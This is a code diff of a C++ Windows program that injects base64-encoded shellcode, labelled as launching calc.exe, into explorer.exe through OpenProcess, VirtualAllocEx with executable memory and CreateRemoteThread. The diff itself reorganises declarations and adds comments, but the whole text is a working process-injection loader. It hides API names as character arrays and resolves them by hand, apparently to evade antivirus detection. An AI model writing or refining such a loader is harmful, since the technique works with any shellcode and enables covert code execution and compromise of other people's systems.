@@ -131,6 +131,15 @@ DWORD get_proc_id(const char* proc_name) {
 }
 
 int main() {
+    // Variable declarations
+    HMODULE h_kernel32;
+    std::string encoded_shellcode;
+    std::string decoded_shellcode;
+    DWORD proc_id;
+    HANDLE h_proc;
+    LPVOID remote_mem;
+    HANDLE h_thread;
+
     // Obfuscated strings for function names
     wchar_t kernel32_dll_wstr[] = {L'k', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', 0};
     char create_toolhelp_str[] = {'C', 'r', 'e', 'a', 't', 'e', 'T', 'o', 'o', 'l', 'h', 'e', 'l', 'p', '3', '2', 'S', 'n', 'a', 'p', 's', 'h', 'o', 't', 0};
@@ -142,9 +151,12 @@ int main() {
     char create_remote_thread_str[] = {'C', 'r', 'e', 'a', 't', 'e', 'R', 'e', 'm', 'o', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0};
     char close_handle_str[] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0};
     char virtual_free_ex_str[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', 'E', 'x', 0};
+    char explorer_exe_str[] = {'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r', '.', 'e', 'x', 'e', 0};
 
-    HMODULE h_kernel32 = get_module_handle_manual(kernel32_dll_wstr);
+    // Get kernel32.dll handle
+    h_kernel32 = get_module_handle_manual(kernel32_dll_wstr);
 
+    // Get function pointers
     CreateToolhelp32Snapshot_ptr = (pCreateToolhelp32Snapshot)get_proc_address_manual(h_kernel32, create_toolhelp_str);
     Process32First_ptr = (pProcess32First)get_proc_address_manual(h_kernel32, process32_first_str);
     Process32Next_ptr = (pProcess32Next)get_proc_address_manual(h_kernel32, process32_next_str);
@@ -155,22 +167,23 @@ int main() {
     CloseHandle_ptr = (pCloseHandle)get_proc_address_manual(h_kernel32, close_handle_str);
     VirtualFreeEx_ptr = (pVirtualFreeEx)get_proc_address_manual(h_kernel32, virtual_free_ex_str);
 
-    // Base64 encoded shellcode for calc.exe
-    std::string encoded_shellcode = "SDHSZUiLQsBIi3AYSLt2IEyLDTyLCU2LSSDrY0GLSTxNMc/BtwlNhUnPRYt/TQHPSYsPEUu3IE0BzuM//8lIMfaBi0SOThzMSMeo0AcIu/REOcJ12kWLVyRNActBC7cMSo0EawSLTAnIw8NBuggp/v+oDuiS//9/SDFJUUi5Y2FsYy5leGVRSM0MJEgxyEj/wkCD7Cj/0A==";
-    std::string decoded_shellcode = base64_decode(encoded_shellcode);
+    // Decode shellcode
+    encoded_shellcode = "SDHSZUiLQsBIi3AYSLt2IEyLDTyLCU2LSSDrY0GLSTxNMc/BtwlNhUnPRYt/TQHPSYsPEUu3IE0BzuM//8lIMfaBi0SOThzMSMeo0AcIu/REOcJ12kWLVyRNActBC7cMSo0EawSLTAnIw8NBuggp/v+oDuiS//9/SDFJUUi5Y2FsYy5leGVRSM0MJEgxyEj/wkCD7Cj/0A==";
+    decoded_shellcode = base64_decode(encoded_shellcode);
 
-    char explorer_exe_str[] = {'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r', '.', 'e', 'x', 'e', 0};
-    DWORD proc_id = get_proc_id(explorer_exe_str);
+    // Get explorer.exe PID
+    proc_id = get_proc_id(explorer_exe_str);
     if (proc_id == 0) {
         return 1;
     }
 
-    HANDLE h_proc = OpenProcess_ptr(PROCESS_ALL_ACCESS, FALSE, proc_id);
+    // Process injection
+    h_proc = OpenProcess_ptr(PROCESS_ALL_ACCESS, FALSE, proc_id);
     if (h_proc == NULL) {
         return 1;
     }
 
-    LPVOID remote_mem = VirtualAllocEx_ptr(h_proc, NULL, decoded_shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    remote_mem = VirtualAllocEx_ptr(h_proc, NULL, decoded_shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (remote_mem == NULL) {
         CloseHandle_ptr(h_proc);
         return 1;
@@ -182,13 +195,14 @@ int main() {
         return 1;
     }
 
-    HANDLE h_thread = CreateRemoteThread_ptr(h_proc, NULL, 0, (LPTHREAD_START_ROUTINE)remote_mem, NULL, 0, NULL);
+    h_thread = CreateRemoteThread_ptr(h_proc, NULL, 0, (LPTHREAD_START_ROUTINE)remote_mem, NULL, 0, NULL);
     if (h_thread == NULL) {
         VirtualFreeEx_ptr(h_proc, remote_mem, 0, MEM_RELEASE);
         CloseHandle_ptr(h_proc);
         return 1;
     }
 
+    // Cleanup
     CloseHandle_ptr(h_thread);
     CloseHandle_ptr(h_proc);
 
